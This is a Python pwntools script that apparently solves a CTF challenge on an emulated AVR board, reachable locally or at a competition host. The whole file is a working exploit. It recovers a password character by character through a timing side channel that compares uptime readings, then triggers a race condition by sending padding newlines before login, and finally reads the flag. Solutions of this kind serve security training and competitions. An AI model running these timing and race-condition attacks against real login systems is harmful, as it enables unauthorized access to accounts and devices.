import argparse
from time import sleep
from subprocess import run
from pwn import remote, process, context

LOCAL_PROC_ARGS = [
    "simavr/examples/board_simduino/obj-x86_64-linux-gnu/simduino.elf", "code.hex"]
REMOTE_HOST = "avr.2020.ctfcompetition.com"
REMOTE_PORT = 1337

context.log_level = "ERROR"  # "DEBUG"


def main():
    password, password_solved = "", False
    print("Finding password...")
    print("Password: ", end="")
    while not password_solved:
        letter, password_solved = timing_attack_next_char(password)
        password += letter
        print(letter, end="" if not password_solved else "\n")

    print("Trying to trigger race condition by padding newlines before login...")
    flag, num_pads = "", 0
    while not flag:
        print(".", end="")
        msg = "\n"*(num_pads+1)+f"agent\n{password}\n"
        io = connect()
        io.send(msg)
        if b"on" in get_post_login_timer_status(io):
            print(f"\nRace condition triggered using {num_pads} padding newlines.")
            flag = get_flag(io).decode()
        io.close()
        num_pads += 1
    print(f"Flag: {flag}")


def timing_attack_next_char(curr_password):
    baseline_times = gen_baseline_times(curr_password)
    msg = "\n"
    for c in map(chr, range(0x21, 0x7f)):
        msg += f"agent\n{curr_password}{c}\n"
    io = connect()
    io.send(msg)
    uptime = get_uptime(io)
    char, password_solved = None, False
    for i in range(0x21, 0x7f):
        if b"Access granted" in get_attempt_output(io):
            char, password_solved = chr(i), True
            break
        new_uptime = get_uptime(io)
        # Don't ever ask me why I am using != instead of >.
        if (new_uptime - uptime) != baseline_times[i-0x21]:
            char = chr(i)
            break
        uptime = new_uptime
    io.close()
    return char, password_solved


def gen_baseline_times(curr_password):
    msg = "\n" + f"agent\n{curr_password}\x7f\n" * (0x7f - 0x21)
    io = connect()
    io.send(msg)
    uptime = get_uptime(io)
    times = []
    for _ in range(0x21, 0x7f):
        new_uptime = get_uptime(io)
        times.append(new_uptime - uptime)
        uptime = new_uptime
    io.close()
    return times


def connect():
    if args.remote:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(LOCAL_PROC_ARGS)

    # The following line makes me RAGE. Don't ever ask me why it exists.
    io.recvuntil("Press ENTER to continue.\n")
    return io


def get_uptime(io):
    io.recvuntil("Uptime: ")
    return int(io.recvline()[:-3])


def get_attempt_output(io):
    io.recvuntil("Password: ")
    return io.recvline()


def get_post_login_timer_status(io):
    io.recvuntil("Access granted.\n")
    return io.recvline()


def get_flag(io):
    sleep(7)
    io.sendline("2")
    io.recvuntil("FLAG IS ")
    return io.recvline()[:-2]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", action="store_true")
    args = parser.parse_args()
    main()
